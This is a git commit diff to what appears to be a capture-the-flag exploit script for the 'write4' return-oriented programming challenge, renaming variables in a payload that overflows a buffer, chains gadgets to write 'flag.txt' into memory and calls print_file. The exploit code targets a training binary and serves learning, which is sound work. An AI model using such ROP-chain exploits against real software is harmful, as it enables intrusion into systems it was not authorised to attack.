21a9c12bd1ab18c7cf157dd4da7f286b4b016df3
Hjn4 <kaycibana11032003@gmail.com>
2023-07-28 22:49:43 +0700

    fix logic name

--- ROP/chall4_write4/exp.py
+++ ROP/chall4_write4/exp.py
@@ -8,19 +8,19 @@ pop_rdi_ret = 0x0000000000400693
 ret = 0x00000000004004e6
 pop_r14_r15 = 0x0000000000400690
 mov_r14add_r15 = 0x0000000000400628
-flag = b'flag.txt'
-r14_str_flag = 0x601040
-r15_address_stored_flag = flag
+
+r14_address_store_flag = 0x601040
+r15_flag = b'flag.txt'
 
 
 payload = b'A'*40 + p64(ret)
 #r14 => address, r15 => flag
-payload += p64(pop_r14_r15) + p64(r14_str_flag) + r15_address_stored_flag
+payload += p64(pop_r14_r15) + p64(r14_address_store_flag) + r15_flag
 # r14 -> address -> r15 (flag)
 payload += p64(mov_r14add_r15) 
 # rdi = r14 = address string flag.txt
 payload += p64(pop_rdi_ret)
-payload += p64(r14_str_flag)
+payload += p64(r14_address_store_flag)
 
 payload += p64(print_file)
 
